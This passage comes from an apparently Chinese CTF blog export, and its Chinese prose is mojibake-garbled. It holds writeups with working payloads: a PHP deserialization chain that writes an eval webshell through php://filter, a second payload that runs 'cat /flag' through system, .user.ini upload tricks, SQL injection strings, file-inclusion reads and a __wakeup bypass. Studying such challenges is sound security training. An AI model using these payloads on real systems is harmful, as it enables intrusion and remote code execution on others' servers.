<h2 id="æ„é€ popé“¾è·¯"><a href="#æ„é€ popé“¾è·¯" class="headerlink" title="æ„é€ popé“¾è·¯"></a>æ„é€ popé“¾è·¯</h2><p>é¦–å…ˆå¯ä»¥çœ‹åˆ° <code>åºåˆ—åŒ–A</code>ï¼Œåœ¨ <code>__destruct</code> ä¸­è°ƒç”¨äº†<code>$this-&gt;save()</code><br>åœ¨ <code>save</code> ä¸­è°ƒç”¨äº† <code>$this-&gt;store-&gt;set</code><br>åœ¨ <code>åºåˆ—åŒ–A</code> è®¾å®š <code>$this-&gt;store</code> ä¸º <code>B</code><br>æœ€åè§¦å‘ <code>$result = file_put_contents($filename, $data);</code></p>
<p>è¯¦æƒ…å¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥<br><a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">POCåˆ©ç”¨é“¾æ¥</a><br><a href="https://www.anquanke.com/post/id/194269" target="_blank" rel="noopener">Thinkphp 6.0ååºåˆ—åŒ–é“¾å†æŒ–æ˜</a></p>
<hr>
<h2 id="å¦‚ä½•ç»•è¿‡-exit"><a href="#å¦‚ä½•ç»•è¿‡-exit" class="headerlink" title="å¦‚ä½•ç»•è¿‡ exit"></a>å¦‚ä½•ç»•è¿‡ exit</h2><p>é¦–å…ˆåœ¨ <code>Bç±»</code> çœ‹åˆ° <code>prefix</code> (ä¸€ä¸ªæ„é€ ç¼“å­˜æ–‡ä»¶åçš„å‚æ•°ï¼‰</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span></span><br><span class="line">        $cache_filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . uniqid() . $name;</span><br><span class="line">        <span class="keyword">if</span>(substr($cache_filename, -strlen(<span class="string">'.php'</span>)) === <span class="string">'.php'</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'?'</span>);</span><br><span class="line">    ...</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ–‡ä»¶åä¸­å«æœ‰ <code>.php</code> å°±ä¼šè¢«è¿‡æ»¤æ‰<br>æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡æ”¹å˜å˜é‡é‡å®šä¹‰ç»•è¿‡</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;key &#x3D; &#39;&#x2F;..&#x2F;manayakko.pHp&#x2F;.&#39;;</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡ <code>/../</code> ç»•è¿‡æ–‡ä»¶åéšæœºå‰ç¼€ï¼Œé€šè¿‡ <code>/.</code> è¿›è¡Œç»•è¿‡æ–‡ä»¶åæ£€éªŒ</p>
<p>ç„¶åå†çœ‹ä¸‹é¢è¿™æ®µä»£ç <br>è¿™æ®µä»£ç ä¼šå¯¼è‡´å³ä¾¿æˆ‘ä»¬åœ¨åé¢æ‹¼æ¥ä¸Šshellä¹Ÿæ— æ³•æ­£å¸¸æ‰§è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">        $result &#x3D; file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡pç¥çš„è®²è§£æˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚ä½•ç»•è¿‡</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">Pç¥çš„link</a></p>
<p><code>php</code> ä¸­çš„ <code>base64_decode</code> å‡½æ•°ä¼šå¿½ç•¥ä¸ç¬¦åˆ <code>base64</code>ç¼–ç çš„å­—ç¬¦ï¼Œ å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰ <code>php00000000exit</code> å’Œæˆ‘ä»¬ä¼ å…¥çš„ <code>$data</code> å˜é‡ï¼Œå› ä¸º <code>base64</code> ç®—æ³•è§£ç æ—¶æ˜¯ <code>4ä¸ªbyteä¸€ç»„</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ§åˆ¶æˆ‘ä»¬éœ€è¦çœŸæ­£è§£ç å†…å®¹çš„å‰é¢éƒ¨åˆ†å­—ç¬¦é•¿åº¦ä¸º4çš„å€æ•°å°±è¡Œ</p>
<hr>
<h2 id="filename"><a href="#filename" class="headerlink" title="$filename"></a>$filename</h2><p>åœ¨ <code>B::getCacheKey($name)</code> ä¸­ï¼Œå°† <code>$this-&gt;options[&#39;prefix&#39;]</code> å’Œ <code>$name</code> æ‹¼æ¥å¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ„é€  B::options å’Œ A::key</span><br><span class="line">ä½¿$filenameä¸º</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;uploads&#x2F;manayakko.php</span><br><span class="line">è¿›è¡Œç»•è¿‡ä¸Šé¢çš„</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="data"><a href="#data" class="headerlink" title="$data"></a>$data</h2><p>å› æ­¤ç”± <code>$value=A::getForStorage()</code> å’Œ <code>B::serialize($value)</code> å¾—åˆ°<br>æ„é€  <code>ç±»A</code> çš„ <code>cache</code> ä¸ºæ•°ç»„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;base64_encode(<span class="string">'&lt;?php eval($_GET[yakko12]);?&gt;'</span>)];</span><br></pre></td></tr></table></figure></div>

<p>å°±å¯ä»¥ä½¿å¾— <code>$value=A::getForStorage()</code> çš„å€¼ä¸º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">"path"</span>:<span class="string">"a"</span>,<span class="string">"dirname"</span>:<span class="string">"Jmx0Oz9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7PyZndDs"</span>&#125;,<span class="keyword">true</span>]</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå†æ„é€  <code>ç±»B</code> çš„ <code>serializeå€¼</code> ä¸º <code>serialize</code>å°±å¯ä»¥ä½¿å¾— <code>B::serialize($value)</code> çš„å€¼ä¸º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">7</span>:<span class="string">"dirname"</span>;s:<span class="number">40</span>:<span class="string">"PD9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7Pz4="</span>;&#125;s:<span class="number">8</span>:<span class="string">"complete"</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·åœ¨æœ€å <code>$data</code> è¢« <code>base64è§£ç </code> çš„æ—¶å€™åªæœ‰<code>php//000000000000exits64pathadirname</code> å’Œ <code>PD9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7Pz4=</code>ï¼Œç„¶åå‰é¢çš„å­—ç¬¦è¢«ç¼–ç æˆåŠŸç»•è¿‡ <code>exit</code></p>
<hr>
<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload 1"></a>Payload 1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cache = [];</span><br><span class="line">    <span class="keyword">public</span> $complete = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'/../manayakko.php/.'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;base64_encode(<span class="string">'&lt;?php eval($_GET[yakko12]);?&gt;'</span>)];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">'serialize'</span> =&gt; <span class="string">'serialize'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">'php://filter/write=convert.base64-decode/resource=./uploads/'</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload 2"></a>Payload 2</h2><p>åé¢çœ‹äº†å¤§ä½¬çš„å†™æ³•ï¼Œå­¦åˆ°äº†å¤§ä½¬çš„æ“ä½œ<br>ç›´æ¥æ‰“å‘½ä»¤è¿›å»ï¼Œç”Ÿæˆflagæ–‡ä»¶ è·å–flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $cache = [];</span><br><span class="line">    <span class="keyword">public</span> $complete = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'/../yakko.phtml'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;<span class="string">'`cat /flag &gt; ./uploads/flag.php`'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">'serialize'</span> =&gt; <span class="string">'system'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">'sssss'</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="è¿˜æœ‰å°±æ˜¯"><a href="#è¿˜æœ‰å°±æ˜¯" class="headerlink" title="è¿˜æœ‰å°±æ˜¯"></a>è¿˜æœ‰å°±æ˜¯</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª <code>shell.pHp</code><br>ç„¶åå†ä¸Šä¼ ä¸€ä¸ª <code>.user.ini</code><br>è§£æäº†å°±èƒ½æŒ‚èœåˆ€</p>
<p>æˆ–è€…å…ˆå†™è§£æ <code>.user.ini</code><br>ç„¶åä¼ å›¾ç‰‡é©¬<br>ä½¿å…¶è¿½åŠ åˆ°å…¶ä»– <code>php</code> åé¢ä½œä¸º <code>php</code> æ‰§è¡Œå³å¯ã€‚<br><a href="http://althims.com/2020/01/29/buu-new-year/" target="_blank" rel="noopener">Moyu å¸ˆå‚…çš„è§£æ³•</a></p>
<hr>
<h1 id="æœ€åæ„Ÿè°¢å¸ˆå‚…ä»¬å†™çš„å‚è€ƒæ–‡çŒ®"><a href="#æœ€åæ„Ÿè°¢å¸ˆå‚…ä»¬å†™çš„å‚è€ƒæ–‡çŒ®" class="headerlink" title="æœ€åæ„Ÿè°¢å¸ˆå‚…ä»¬å†™çš„å‚è€ƒæ–‡çŒ®"></a>æœ€åæ„Ÿè°¢å¸ˆå‚…ä»¬å†™çš„å‚è€ƒæ–‡çŒ®</h1><p>æŠŠä¸Šé¢çš„å‚è€ƒæ€»ç»“ä¸€ä¸‹<br><a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">EIS2019 WP</a><br><a href="https://baijiahao.baidu.com/s?id=1651516647542803980&wfr=spider&for=pc" target="_blank" rel="noopener">2019é«˜æ ¡è¿ç»´èµ›writeup</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a><br><a href="https://www.anquanke.com/post/id/194269" target="_blank" rel="noopener">Thinkphp 6.0ååºåˆ—åŒ–é“¾å†æŒ–æ˜</a><br><a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">Thinkphp 6.0 æ–°çš„Gadget</a><br><a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">èµµå¸ˆå‚…çš„å®˜æ–¹wp</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2019æå®¢å¤§æŒ‘æˆ˜å¤ç°</title>
    <url>/yakko117/2020/01/19/%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">æå®¢å¤§æŒ‘æˆ˜ 2019é¢˜ç›®é“¾æ¥</a></p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h1><p>è¡Œå§</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ˜¯å®˜æ–¹çš„Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin/admin<span class="string">'||'</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h1><p>æºç å­˜åœ¨hintï¼Œemmmmm è¿™å¤ç°mdçªç„¶ä¸æƒ³åšäº†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line"></span><br><span class="line">Payloadï¼š</span><br><span class="line">cat = dog</span><br></pre></td></tr></table></figure></div>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1><p>æŸ¥çœ‹æºç ï¼Œå­˜åœ¨ <code>./Archive_room.php</code>ï¼Œç„¶åå›æ˜¾ <code>Secret</code> </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0z9444j30q40f7dg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0z9444j30q40f7dg3.jpg" class="lazyload" title="test"></a></p>
<p>ç‚¹è¿›å»è·³è½¬åˆ° <code>end.php</code> ï¼ŒæŠ“åŒ…å‘ç°æ–°çš„ <code>secr3t.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç†Ÿæ‚‰çš„æ–‡ä»¶åŒ…å«ï¼Œ <code>file ä¼ªåè®®</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°çš„ <code>base64</code> è§£ç å¾—åˆ° flag</p>
<hr>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p>é¢˜ç›®è¯´æœ‰è‰¯å¥½çš„å¤‡ä»½ä¹ æƒ¯ï¼Œæ‰«åå°æ‰«å‡ºäº† <code>www.zip</code></p>
<p>æ‹¿åˆ°æºç åï¼Œè¿›è¡Œä»£ç å®¡è®¡</p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">$select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬éœ€è¦ç»•è¿‡ <code>__wakeupé­”æ³•å‡½æ•°</code> å»æ‰§è¡Œ <code>__destruct()å‡½æ•°</code><br><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">å‚è€ƒæ–‡æ¡£ç»•è¿‡æ–¹æ³•</a></p>
<p>æˆ‘ä»¬åœ¨è°ƒç”¨ <code>__destruct()å‡½æ•°</code> åï¼Œæƒ³è¦æˆåŠŸè·å–flagè¿˜è¦ä¸¤ä¸ªæ¡ä»¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username = admin;</span><br><span class="line">password = <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>


<p>è€Œä¸”é¢˜ç›®ä¸­çš„ <code>username</code> å’Œ <code>password</code> çš„å€¼éƒ½æ˜¯ <code>private</code><br>æ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>new Name</code> å»æ„é€ æ•°å€¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b = serialize(a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœå¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0zau9tj30jk02egmr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0zau9tj30jk02egmr.jpg" class="lazyload" title="test"></a></p>
<p>é€šè¿‡URLç¼–ç è¾“å‡º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3a4%3a%22Name%22%3a2%3a%7bs%3a14%3a%22+Name+username%22%3bs%3a5%3a%22admin%22%3bs%3a14%3a%22+Name+password%22%3bi%3a100%3b%7d</span><br></pre></td></tr></table></figure></div>

<p>å°†åŠ å·ä¿®æ”¹æˆ <code>%00</code>ï¼Œç„¶åå°†è¾“å…¥çš„ <code>2</code> æ”¹æˆ <code>3</code> è¿›è¡Œç»•è¿‡<br><strong>å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>a4%<span class="number">3</span>a<span class="string">"Name"</span>%<span class="number">3</span>a4%<span class="number">3</span>a%<span class="number">7</span>bs%<span class="number">3</span>a14%<span class="number">3</span>a<span class="string">"%00Name%00username"</span>%<span class="number">3</span>bs%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">"admin"</span>%<span class="number">3</span>bs%<span class="number">3</span>a14%<span class="number">3</span>a<span class="string">"%00Name%00password"</span>%<span class="number">3</span>bi%<span class="number">3</span>a100%<span class="number">3</span>b%<span class="number">7</span>d</span><br></pre></td></tr></table></figure></div>

<p>Payload æäº¤å è¿”å› <code>flag</code></p>
<hr>
